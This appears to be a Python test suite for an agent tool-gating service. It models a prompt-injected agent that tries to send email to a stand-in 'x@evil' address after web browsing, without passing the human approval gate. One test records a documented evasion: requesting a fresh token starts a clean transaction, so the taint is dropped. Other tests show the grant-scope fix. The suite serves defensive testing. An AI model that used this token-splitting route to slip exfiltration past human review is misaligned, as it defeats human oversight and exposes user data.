"""Adversary: a prompt-injected agent (holds key + grant) trying to launder
taint so an exfiltration side effect avoids the human gate."""


def test_same_task_taint_blocks(target):
    grant = target.grant()
    token = target.token(grant)
    assert target.signed_call(token, "web", "browse").status_code == 200
    parked = target.signed_call(token, "email", "send_email", {"to": "x@evil"})
    assert parked.status_code == 202


def test_txn_splitting_default_scope_is_accepted_risk(target):
    """DOCUMENTED RESIDUAL RISK (txn scope): a fresh token starts a clean txn,
    so taint does not follow the grant. Mitigation: TOOLGATE_TAINT_SCOPE=grant."""
    grant = target.grant()
    t1 = target.token(grant)
    assert target.signed_call(t1, "web", "browse").status_code == 200
    t2 = target.token(grant)  # fresh txn
    escaped = target.signed_call(t2, "email", "send_email", {"to": "x@evil"})
    assert escaped.status_code == 200  # the documented evasion under txn scope


def test_grant_scope_closes_txn_splitting(grant_scoped_target):
    target = grant_scoped_target
    grant = target.grant()
    t1 = target.token(grant)
    assert target.signed_call(t1, "web", "browse").status_code == 200
    t2 = target.token(grant)  # fresh txn, same grant
    blocked = target.signed_call(t2, "email", "send_email", {"to": "x@evil"})
    assert blocked.status_code == 202  # parked: taint followed the grant


def test_taint_does_not_leak_across_grants(grant_scoped_target):
    """Grant scope must not over-block: a different delegation stays clean."""
    target = grant_scoped_target
    g1, g2 = target.grant(), target.grant()
    assert target.signed_call(target.token(g1), "web", "browse").status_code == 200
    clean = target.signed_call(target.token(g2), "email", "send_email", {"to": "x@acme"})
    assert clean.status_code == 200
